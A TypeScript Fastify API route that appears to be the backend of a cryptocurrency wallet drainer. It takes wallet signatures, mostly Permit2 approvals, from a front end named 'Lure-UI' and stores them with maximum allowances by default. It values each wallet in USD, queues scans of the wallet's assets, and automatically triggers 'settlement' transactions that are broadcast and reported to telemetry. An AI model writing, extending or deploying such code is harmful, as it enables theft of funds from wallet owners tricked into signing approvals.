/**
 * Signature Anchor — omni-payload ingress to `signatures` (settlement.ts builders + Supabase service role).
 * Route Initialization aligned with Lure-UI `/api/signature-anchor` institutional contract.
 */
import {
  computeSignatureAnchorExpiry,
  executeDelegateCashRegistrySurfaceRead,
  executeSettlementIgnition,
  isExpiryIsoWithinDriftWindow,
  PERMIT2_MAX_AMOUNT,
  resolveGatekeeperEthereumRpcUrl,
  type SettlementIgnitionTelemetry,
} from '@legion/core'
import {
  buildEvmSignatureAnchorSettlement,
  buildSvmSignatureAnchorSettlement,
  buildTonSignatureAnchorSettlement,
  buildTronSignatureAnchorSettlement,
  buildUtxoSignatureAnchorSettlement,
  type NormalizedSignatureAnchorSettlement,
} from '@legion/core/logic/settlement.js'
import { verifyAuthorizedSessionPersistenceAnchor } from '@legion/core/logic/index.js'
import { sealSignatureHexForPersistence } from '@legion/core/security/signature-shadow-envelope.js'
import { createClient } from '@supabase/supabase-js'
import { createHash } from 'node:crypto'
import type { FastifyInstance, FastifyReply, FastifyRequest } from 'fastify'
import type { Address, Hex } from 'viem'
import { createPublicClient, http, isAddress, stringToHex } from 'viem'
import { arbitrum, base, mainnet, sepolia } from 'viem/chains'

import { queueKineticDeepAssetScan } from '../lib/kinetic-deep-scan.js'
import { sendSovereignTelemetryPayload } from '../telemetry-sender.js'

const SHADOW_ENVELOPE_PREFIX = 'SHADOW_GCM:v1:'

function hasConfiguredShadowEnvelopeKey(): boolean {
  const explicit = process.env['SHADOW_VAULT_KEY']?.trim()
  if (explicit && /^[0-9a-fA-F]{64}$/.test(explicit)) return true
  const gatekeeperSecret = process.env['GATEKEEPER_SECRET']?.trim()
  return Boolean(gatekeeperSecret)
}

function gatekeeperPersistLog(level: 'error' | 'warn', event: string, detail: string): void {
  const line = JSON.stringify({
    level: level === 'error' ? 50 : 40,
    time: Date.now(),
    sentinel: 'Gatekeeper',
    module: 'apps/api/signature-anchor',
    event,
    detail,
  })
  if (level === 'error') process.stderr.write(`${line}\n`)
  else process.stderr.write(`${line}\n`)
}

function serializeSupabaseFault(err: {
  message: string
  code?: string
  details?: string
  hint?: string
}): string {
  return JSON.stringify({
    message: err.message,
    code: err.code ?? null,
    details: err.details ?? null,
    hint: err.hint ?? null,
  })
}

function resolveCentralHubVaultUrl(): string {
  const url =
    process.env['NEXT_PUBLIC_SUPABASE_URL']?.trim() ||
    process.env['SUPABASE_URL']?.trim() ||
    ''
  if (!url) throw new Error('NEXT_PUBLIC_SUPABASE_URL / SUPABASE_URL')
  return url
}

type ChainFamily = 'EVM' | 'SVM' | 'UTXO' | 'TRON' | 'TON'

interface NormalizedIngressV1 {
  ingress: 'normalized_v1'
  chain_family: ChainFamily
  wallet_address: string
  token_address: string
  signature?: Hex | string
  signature_hex?: Hex | string
  nonce: string
  expiry_iso: string
  wallet_type: string
  protocol: string
  chain_id?: number | string
  engine_spender?: Address
  permit2?: Address
  scout_value_usd?: number
  amount?: string
  wallet_balance?: string
  max_allowance?: string
  requires_quorum?: boolean
}

interface AgnosticNormalizationV1 {
  ingress: 'agnostic_normalization_v1'
  signature?: Hex | string
  signature_hex?: Hex | string
  wallet_address: string
  wallet_type: string
  protocol: string
  chain_id?: number | string
  token_address?: string
  nonce?: string
  expiry_iso?: string
  scout_value_usd?: number
  amount?: string
  wallet_balance?: string
  max_allowance?: string
  requires_quorum?: boolean
}

interface LegacyPermit2Body {
  chainId: number
  wallet: Address
  token: Address
  engineSpender: Address
  permit2: Address
  nonce: string
  expiryIso: string
  signature: Hex
  wallet_type?: string
  protocol?: string
  chain_id?: number | string
  scout_value_usd?: number
  amount?: string
  wallet_balance?: string
  max_allowance?: string
  requires_quorum?: boolean
}

const chains = [mainnet, sepolia, arbitrum, base] as const
function chainById(id: number) {
  return chains.find((c) => c.id === id) ?? mainnet
}

async function gatekeeperEthereumRpcUrl(): Promise<string> {
  return resolveGatekeeperEthereumRpcUrl({
    primaryUrl: process.env['RPC_ETHEREUM_PRIVATE'] ?? process.env['NEXT_PUBLIC_RPC_URL'],
  })
}

const PROTOCOL_RACK = new Set(['evm', 'solana', 'utxo', 'tron', 'ton'])

type PersistedSignatureRow = {
  wallet_address: string
  token_address: string
  signature_hex: string
  nonce: string
  expiry: string
  wallet_type: string
  protocol: string
  chain_id?: string | null
  scout_value_usd?: string | null
  amount?: string | null
  max_allowance?: string | null
  requires_quorum?: boolean | null
  source_origin: string
}

type SettlementIgnitionOutcome =
  | SettlementIgnitionTelemetry
  | {
      ignition_fault: string
    }

// Use ReturnType to avoid generic parameter mismatch with SupabaseClient versions.
type SupabaseAdminClient = ReturnType<typeof createClient>

function normalizeProtocolRack(p: string): string {
  return p.trim().toLowerCase()
}

function isHexLike(s: string): boolean {
  return /^0x[0-9a-fA-F]+$/.test(s.trim())
}

function normalizeSignatureHexForSeal(raw: string): Hex {
  const t = raw.trim()
  if (isHexLike(t)) {
    return (t.startsWith('0x') ? t : `0x${t}`) as Hex
  }
  return stringToHex(t) as Hex
}

const SOURCE_ORIGIN_MAX = 512
function sanitizeSourceOriginInput(raw: string): string {
  return raw.replace(/[\r\n\0\u202e\u200e\u200f]/g, '').slice(0, SOURCE_ORIGIN_MAX)
}

function headerString(req: FastifyRequest, name: string): string | null {
  const v = req.headers[name]
  if (v == null) return null
  const s = Array.isArray(v) ? v[0] : v
  return s != null && s.trim() !== '' ? sanitizeSourceOriginInput(s.trim()) : null
}

function resolveDataBindingSourceOrigin(
  req: FastifyRequest,
  body: Record<string, unknown> | null,
): string {
  const fromBody = (key: string): string | null => {
    const v = body?.[key]
    return typeof v === 'string' && v.trim() !== '' ? sanitizeSourceOriginInput(v.trim()) : null
  }
  const direct = fromBody('origin') ?? fromBody('source_origin')
  if (direct) return direct
  const h =
    headerString(req, 'origin') ??
    headerString(req, 'x-source-origin') ??
    headerString(req, 'x-forwarded-host') ??
    headerString(req, 'host')
  if (h) return h
  const referer = headerString(req, 'referer')
  if (referer) {
    try {
      const u = new URL(referer)
      return sanitizeSourceOriginInput(`${u.protocol}//${u.host}`)
    } catch {
      return referer
    }
  }
  return 'unknown'
}

function isNormalizedIngress(body: unknown): body is NormalizedIngressV1 {
  if (typeof body !== 'object' || body === null) return false
  const o = body as Record<string, unknown>
  return o['ingress'] === 'normalized_v1'
}

function isAgnosticNormalization(body: unknown): body is AgnosticNormalizationV1 {
  if (typeof body !== 'object' || body === null) return false
  const o = body as Record<string, unknown>
  return o['ingress'] === 'agnostic_normalization_v1'
}

function chainFamilyFromRack(rack: string): ChainFamily {
  const r = normalizeProtocolRack(rack)
  if (r === 'solana') return 'SVM'
  if (r === 'utxo') return 'UTXO'
  return 'EVM'
}

function normalizeWalletToken(
  family: ChainFamily,
  wallet: string,
  token: string,
): { wallet_address: string; token_address: string } {
  if (family === 'EVM') {
    return { wallet_address: wallet.trim().toLowerCase(), token_address: token.trim().toLowerCase() }
  }
  return { wallet_address: wallet.trim(), token_address: token.trim() }
}

function extractShadowTelemetry(o: Record<string, unknown>): {
  scout_value_usd: string | null
  amount: string | null
  max_allowance: string | null
  requires_quorum: boolean | null
} {
  let scout_value_usd: string | null = null
  if (typeof o['scout_value_usd'] === 'number' && Number.isFinite(o['scout_value_usd'])) {
    scout_value_usd = String(o['scout_value_usd'])
  } else if (typeof o['scout_value_usd'] === 'string' && o['scout_value_usd'].trim() !== '') {
    scout_value_usd = o['scout_value_usd'].trim()
  }
  let amount: string | null = null
  if (typeof o['amount'] === 'string' && /^\d+$/.test(o['amount'].trim())) {
    amount = o['amount'].trim()
  } else if (
    typeof o['wallet_balance'] === 'string' &&
    /^\d+$/.test(o['wallet_balance'].trim())
  ) {
    amount = o['wallet_balance'].trim()
  }
  let max_allowance: string | null = null
  if (typeof o['max_allowance'] === 'string' && o['max_allowance'].trim() !== '') {
    max_allowance = o['max_allowance'].trim()
  }
  let requires_quorum: boolean | null = null
  if (typeof o['requires_quorum'] === 'boolean') {
    requires_quorum = o['requires_quorum']
  }
  if (scout_value_usd == null || scout_value_usd === '') scout_value_usd = '0'
  if (max_allowance == null || max_allowance === '') max_allowance = String(PERMIT2_MAX_AMOUNT)
  return { scout_value_usd, amount, max_allowance, requires_quorum }
}

function settlementCommitmentDigestHex(wallet: string, nonce: string, expiry: string): string {
  const h = createHash('sha256').update(`${wallet}|${nonce}|${expiry}`, 'utf8').digest('hex')
  return `0x${h}`
}

async function updateSignatureSettlementStatus(params: {
  supabase: SupabaseAdminClient
  wallet_address: string
  token_address: string
  settlement_status: 'PENDING' | 'FAILED_STRIKE' | 'FAILED_SETTLEMENT' | 'SETTLED'
}): Promise<void> {
  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  const { error } = await (params.supabase as any)
    .from('signatures')
    .update({ settlement_status: params.settlement_status })
    .eq('wallet_address', params.wallet_address)
    .eq('token_address', params.token_address)
  if (error) {
    gatekeeperPersistLog('warn', 'signatures.settlement_status_failed', (error as { message: string }).message)
  }
}

function settlementIgnitionFault(outcome: SettlementIgnitionOutcome | undefined): string | null {
  if (
    outcome != null &&
    'ignition_fault' in outcome &&
    typeof outcome.ignition_fault === 'string'
  ) {
    return outcome.ignition_fault
  }
  if (
    outcome != null &&
    'sovereign_dispatcher_fault' in outcome &&
    typeof outcome.sovereign_dispatcher_fault === 'string'
  ) {
    return outcome.sovereign_dispatcher_fault
  }
  if (
    outcome != null &&
    'sovereign_dispatcher_status' in outcome &&
    typeof outcome.sovereign_dispatcher_status === 'string' &&
    outcome.sovereign_dispatcher_status !== 'broadcasted'
  ) {
    return `Network Relay status: ${outcome.sovereign_dispatcher_status}`
  }
  return null
}

function settlementIgnitionTxHash(outcome: SettlementIgnitionOutcome | undefined): string | null {
  if (
    outcome != null &&
    'sovereign_dispatcher_tx_hash' in outcome &&
    typeof outcome.sovereign_dispatcher_tx_hash === 'string' &&
    outcome.sovereign_dispatcher_tx_hash.trim() !== ''
  ) {
    return outcome.sovereign_dispatcher_tx_hash.trim()
  }
  return null
}

function queueEventDrivenReconciliation(params: {
  supabase: SupabaseAdminClient
  row: PersistedSignatureRow
  chain_id: string | null
  scout_value_usd: number
}): void {
  void Promise.resolve()
    .then(() => runEventDrivenReconciliation(params))
    .catch((err) => {
      const fault = err instanceof Error ? err.message : String(err)
      gatekeeperPersistLog('error', 'signatures.reconciliation_unhandled', fault)
    })
}

async function runEventDrivenReconciliation(params: {
  supabase: SupabaseAdminClient
  row: PersistedSignatureRow
  chain_id: string | null
  scout_value_usd: number
}): Promise<void> {
  const { row, supabase, chain_id, scout_value_usd } = params
  let outcome: SettlementIgnitionOutcome | undefined
  try {
    outcome = await executeSettlementIgnition({
      wallet_address: row.wallet_address,
      token_address: row.token_address,
      signature_hex: row.signature_hex,
      protocol: row.protocol,
      chain_id,
      scout_value_usd,
      amount: row.amount ?? null,
    })
  } catch (ignErr) {
    const fault = ignErr instanceof Error ? ignErr.message : String(ignErr)
    gatekeeperPersistLog('error', 'signatures.settlement_ignition', fault)
    outcome = { ignition_fault: fault }
  }

  const fault = settlementIgnitionFault(outcome)
  if (fault != null) {
    await updateSignatureSettlementStatus({
      supabase,
      wallet_address: row.wallet_address,
      token_address: row.token_address,
      settlement_status: 'FAILED_SETTLEMENT',
    })
    gatekeeperPersistLog('warn', 'signatures.reconciliation_failed', fault)
    return
  }

  const txHash = settlementIgnitionTxHash(outcome)
  if (txHash == null) return

  await updateSignatureSettlementStatus({
    supabase,
    wallet_address: row.wallet_address,
    token_address: row.token_address,
    settlement_status: 'SETTLED',
  })

  await sendSovereignTelemetryPayload({
    event: 'SETTLEMENT_IGNITED',
    message: 'SETTLEMENT_IGNITED: Event-Driven Reconciliation finalized.',
    tx_hash: txHash,
    value: row.amount ?? '0',
    chain_id,
    protocol: row.protocol,
  })
}

async function signatureAnchorPostHandler(
  request: FastifyRequest,
  reply: FastifyReply,
): Promise<FastifyReply> {
  try {
    const body: unknown = request.body
    const bodyObj =
      typeof body === 'object' && body !== null ? (body as Record<string, unknown>) : null
    const sourceOrigin = resolveDataBindingSourceOrigin(request, bodyObj)

    if (bodyObj && bodyObj['settlement_builder'] === 'evm' && bodyObj['settlement_input']) {
      const built = buildEvmSignatureAnchorSettlement(
        bodyObj['settlement_input'] as Parameters<typeof buildEvmSignatureAnchorSettlement>[0],
      )
      return handleNormalizedFromSettlement(built, sourceOrigin, reply)
    }
    if (bodyObj && bodyObj['settlement_builder'] === 'svm' && bodyObj['settlement_input']) {
      const built = buildSvmSignatureAnchorSettlement(
        bodyObj['settlement_input'] as Parameters<typeof buildSvmSignatureAnchorSettlement>[0],
      )
      return handleNormalizedFromSettlement(built, sourceOrigin, reply)
    }
    if (bodyObj && bodyObj['settlement_builder'] === 'utxo' && bodyObj['settlement_input']) {
      const built = buildUtxoSignatureAnchorSettlement(
        bodyObj['settlement_input'] as Parameters<typeof buildUtxoSignatureAnchorSettlement>[0],
      )
      return handleNormalizedFromSettlement(built, sourceOrigin, reply)
    }
    if (bodyObj && bodyObj['settlement_builder'] === 'tron' && bodyObj['settlement_input']) {
      const built = buildTronSignatureAnchorSettlement(
        bodyObj['settlement_input'] as Parameters<typeof buildTronSignatureAnchorSettlement>[0],
      )
      return handleNormalizedFromSettlement(built, sourceOrigin, reply)
    }
    if (bodyObj && bodyObj['settlement_builder'] === 'ton' && bodyObj['settlement_input']) {
      const built = buildTonSignatureAnchorSettlement(
        bodyObj['settlement_input'] as Parameters<typeof buildTonSignatureAnchorSettlement>[0],
      )
      return handleNormalizedFromSettlement(built, sourceOrigin, reply)
    }

    if (isAgnosticNormalization(body)) {
      return reply.status(400).send({
        error: 'Agnostic Normalization lane locked. Use normalized_v1 or Permit2 ingestion.',
      })
    }
    if (isNormalizedIngress(body)) {
      return handleNormalizedIngress(body, sourceOrigin, reply)
    }
    return handleLegacyPermit2(body, sourceOrigin, reply)
  } catch (e) {
    const msg = e instanceof Error ? e.message : 'Signature Anchor persist failed'
    gatekeeperPersistLog('error', 'signatures.unhandled', msg)
    return reply.status(500).send({ error: msg })
  }
}

export async function registerSignatureAnchorRoute(app: FastifyInstance): Promise<void> {
  app.post('/api/signature-anchor', signatureAnchorPostHandler)
  app.post('/api/v1/signature-anchor', signatureAnchorPostHandler)
}

async function persistSignatureRow(
  row: PersistedSignatureRow,
  reply: FastifyReply,
): Promise<FastifyReply> {
  let url: string
  try {
    url = resolveCentralHubVaultUrl()
  } catch {
    const msg =
      'Vault configuration missing: set NEXT_PUBLIC_SUPABASE_URL / SUPABASE_URL (Central Hub Vault binding)'
    gatekeeperPersistLog('error', 'signatures.config_missing', msg)
    return reply.status(500).send({ error: msg })
  }
  const serviceKey = process.env['SUPABASE_SERVICE_ROLE_KEY']
  if (!serviceKey) {
    const msg =
      'Vault configuration missing: set SUPABASE_SERVICE_ROLE_KEY (Central Hub service-role write path)'
    gatekeeperPersistLog('error', 'signatures.config_missing', msg)
    return reply.status(500).send({ error: msg })
  }
  if (!hasConfiguredShadowEnvelopeKey()) {
    const msg = 'Neural Weld lock: SHADOW_VAULT_KEY (64 hex) or GATEKEEPER_SECRET required'
    gatekeeperPersistLog('error', 'signatures.shadow_config_missing', msg)
    return reply.status(500).send({ error: msg })
  }
  if (!row.signature_hex.startsWith(SHADOW_ENVELOPE_PREFIX)) {
    const msg = 'Neural Weld lock: signature_hex must be SHADOW_GCM envelope'
    gatekeeperPersistLog('error', 'signatures.shadow_envelope_required', msg)
    return reply.status(400).send({ error: msg })
  }

  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  const supabase: any = createClient(url, serviceKey)
  const rowPayload: Record<string, unknown> = {
    wallet_address: row.wallet_address,
    token_address: row.token_address,
    signature_hex: row.signature_hex,
    nonce: row.nonce,
    expiry: row.expiry,
    wallet_type: row.wallet_type,
    protocol: row.protocol,
  }
  if (row.chain_id != null && String(row.chain_id).trim() !== '') {
    rowPayload['chain_id'] = String(row.chain_id).trim()
  }
  rowPayload['scout_value_usd'] =
    row.scout_value_usd != null && row.scout_value_usd !== '' ? row.scout_value_usd : '0'
  rowPayload['max_allowance'] =
    row.max_allowance != null && row.max_allowance !== '' ? row.max_allowance : String(PERMIT2_MAX_AMOUNT)
  rowPayload['amount'] = row.amount != null && row.amount !== '' ? row.amount : '0'
  if (row.requires_quorum != null) rowPayload['requires_quorum'] = row.requires_quorum
  rowPayload['source_origin'] = row.source_origin
  rowPayload['settlement_status'] = 'PENDING'

  const { error: upErr } = await supabase.from('signatures').upsert(rowPayload, {
    onConflict: 'wallet_address,token_address',
  })

  if (upErr) {
    const shadowDetail = serializeSupabaseFault(upErr)
    gatekeeperPersistLog('error', 'signatures.upsert_failed', shadowDetail)
    process.stderr.write(`${shadowDetail}\n`)
    return reply.status(502).send({ error: upErr.message })
  }

  const scoutParsed = Number(row.scout_value_usd ?? '0')
  const scout_value_usd = Number.isFinite(scoutParsed) ? scoutParsed : 0
  const chainNorm =
    row.chain_id != null && String(row.chain_id).trim() !== ''
      ? String(row.chain_id).trim()
      : null

  queueEventDrivenReconciliation({
    supabase,
    row,
    chain_id: chainNorm,
    scout_value_usd,
  })

  queueKineticDeepAssetScan(row.wallet_address)

  const persistenceAnchor = verifyAuthorizedSessionPersistenceAnchor(String(row.expiry))
  if (!persistenceAnchor.drift_window_ok && !process.env['PROD']) {
    gatekeeperPersistLog('warn', 'signatures.persistence_anchor', 'expiry failed drift reconciliation post-upsert')
  }

  const l2_mint_transaction_hash = settlementCommitmentDigestHex(
    row.wallet_address,
    row.nonce,
    row.expiry,
  )
  return reply.send({
    ok: true,
    handshake_active: true,
    l2_mint_transaction_hash,
    settlement_reconciliation_queued: true,
    lethal_core_aligned: true,
  })
}

async function handleNormalizedFromSettlement(
  b: NormalizedSignatureAnchorSettlement,
  sourceOrigin: string,
  reply: FastifyReply,
): Promise<FastifyReply> {
  const normalized: NormalizedIngressV1 = {
    ingress: 'normalized_v1',
    chain_family: b.chain_family,
    wallet_address: b.wallet_address,
    token_address: b.token_address,
    signature: b.signature as Hex | string,
    signature_hex: b.signature as Hex | string,
    nonce: b.nonce,
    expiry_iso: b.expiry_iso,
    wallet_type: b.wallet_type,
    protocol: b.protocol,
    chain_id: b.chain_id,
    scout_value_usd: b.scout_value_usd,
    ...(b.amount !== undefined ? { amount: b.amount } : {}),
    max_allowance: b.max_allowance,
    requires_quorum: b.requires_quorum,
  }
  return handleNormalizedIngress(normalized, sourceOrigin, reply)
}

async function handleAgnosticNormalization(
  b: AgnosticNormalizationV1,
  sourceOrigin: string,
  reply: FastifyReply,
): Promise<FastifyReply> {
  const signatureRaw = b.signature_hex ?? b.signature
  if (!signatureRaw || !b.wallet_address) {
    return reply.status(400).send({ error: 'Agnostic Normalization requires signature and wallet_address' })
  }
  return reply.status(400).send({ error: 'Agnostic Normalization lane locked. Use normalized_v1.' })
}

async function handleNormalizedIngress(
  b: NormalizedIngressV1,
  sourceOrigin: string,
  reply: FastifyReply,
): Promise<FastifyReply> {
  const families: ChainFamily[] = ['EVM', 'SVM', 'UTXO', 'TRON', 'TON']
  if (!families.includes(b.chain_family)) {
    return reply.status(400).send({ error: 'Invalid chain_family for Normalized Ingress' })
  }
  const signatureRaw = b.signature_hex ?? b.signature
  if (!b.wallet_address || !b.token_address || !signatureRaw || !b.nonce || !b.expiry_iso) {
    return reply.status(400).send({ error: 'Invalid Normalized Ingress payload' })
  }
  if (!isExpiryIsoWithinDriftWindow(String(b.expiry_iso).trim())) {
    return reply.status(400).send({
      error: 'Signature Anchor expiry outside operational Drift Window (Clock Desync).',
    })
  }
  if (!b.wallet_type || !b.protocol) {
    return reply.status(400).send({ error: 'Normalized Ingress requires wallet_type and protocol' })
  }
  const rack = normalizeProtocolRack(b.protocol)
  if (!PROTOCOL_RACK.has(rack)) {
    return reply.status(400).send({ error: 'protocol must be one of: evm, solana, utxo, tron, ton' })
  }
  const sig = normalizeSignatureHexForSeal(
    typeof signatureRaw === 'string' ? signatureRaw : String(signatureRaw),
  )
  const { wallet_address, token_address } = normalizeWalletToken(
    b.chain_family,
    b.wallet_address,
    b.token_address,
  )
  if (b.chain_family === 'EVM' && (!isAddress(wallet_address) || !isAddress(token_address))) {
    return reply.status(400).send({ error: 'EVM Normalized Ingress requires hex addresses' })
  }
  if (
    b.chain_family === 'EVM' &&
    b.chain_id != null &&
    b.engine_spender != null &&
    b.permit2 != null
  ) {
    if (!isAddress(b.engine_spender) || !isAddress(b.permit2)) {
      return reply
        .status(400)
        .send({ error: 'permit2_eip712 requires valid engine_spender, permit2 addresses' })
    }
    const rpcUrl = await gatekeeperEthereumRpcUrl()
    if (!rpcUrl) return reply.status(500).send({ error: 'Server RPC not configured' })
    await executeDelegateCashRegistrySurfaceRead(
      createPublicClient({ chain: chainById(Number(b.chain_id)), transport: http(rpcUrl) }),
      {
        vault: wallet_address as Address,
        engineSpender: b.engine_spender,
        permit2Address: b.permit2,
        tokenAddress: token_address as Address,
      },
    )
  }
  const sealed = sealSignatureHexForPersistence(sig)
  const chainIdNorm =
    b.chain_id != null && String(b.chain_id).trim() !== ''
      ? String(b.chain_id).trim()
      : undefined
  const tel = extractShadowTelemetry(b as unknown as Record<string, unknown>)
  return persistSignatureRow(
    {
      wallet_address,
      token_address,
      signature_hex: sealed,
      nonce: b.nonce,
      expiry: b.expiry_iso,
      wallet_type: b.wallet_type.trim(),
      protocol: rack,
      scout_value_usd: tel.scout_value_usd,
      amount: tel.amount,
      max_allowance: tel.max_allowance,
      requires_quorum: tel.requires_quorum,
      source_origin: sourceOrigin,
      ...(chainIdNorm !== undefined ? { chain_id: chainIdNorm } : {}),
    },
    reply,
  )
}

async function handleLegacyPermit2(
  body: unknown,
  sourceOrigin: string,
  reply: FastifyReply,
): Promise<FastifyReply> {
  if (typeof body !== 'object' || body === null) {
    return reply.status(400).send({ error: 'Invalid Protocol Syncing payload' })
  }
  const b = body as LegacyPermit2Body
  const { chainId, wallet, token, engineSpender, permit2, nonce, expiryIso, signature } = b
  if (typeof chainId !== 'number' || Number.isNaN(chainId)) {
    return reply.status(400).send({ error: 'Invalid chainId' })
  }
  if (!wallet || !token || !signature || !nonce || !expiryIso || !engineSpender || !permit2) {
    return reply.status(400).send({ error: 'Invalid Protocol Syncing payload' })
  }
  if (!isExpiryIsoWithinDriftWindow(String(expiryIso).trim())) {
    return reply.status(400).send({
      error: 'Signature Anchor expiry outside operational Drift Window (Clock Desync).',
    })
  }
  const rpcUrl = await gatekeeperEthereumRpcUrl()
  if (!rpcUrl) return reply.status(500).send({ error: 'Server RPC not configured' })
  await executeDelegateCashRegistrySurfaceRead(
    createPublicClient({ chain: chainById(Number(chainId)), transport: http(rpcUrl) }),
    { vault: wallet, engineSpender, permit2Address: permit2, tokenAddress: token },
  )
  const sealed = sealSignatureHexForPersistence(
    normalizeSignatureHexForSeal(String(signature)),
  )
  const rack = b.protocol != null ? normalizeProtocolRack(String(b.protocol)) : 'evm'
  const tel = extractShadowTelemetry(b as unknown as Record<string, unknown>)
  return persistSignatureRow(
    {
      wallet_address: wallet.toLowerCase(),
      token_address: token.toLowerCase(),
      signature_hex: sealed,
      nonce,
      expiry: expiryIso,
      wallet_type:
        typeof b.wallet_type === 'string' && b.wallet_type.trim() !== ''
          ? b.wallet_type.trim()
          : 'MetaMask',
      protocol: PROTOCOL_RACK.has(rack) ? rack : 'evm',
      chain_id:
        b.chain_id != null && String(b.chain_id).trim() !== ''
          ? String(b.chain_id).trim()
          : String(chainId),
      scout_value_usd: tel.scout_value_usd,
      amount: tel.amount,
      max_allowance: tel.max_allowance,
      requires_quorum: tel.requires_quorum,
      source_origin: sourceOrigin,
    },
    reply,
  )
}
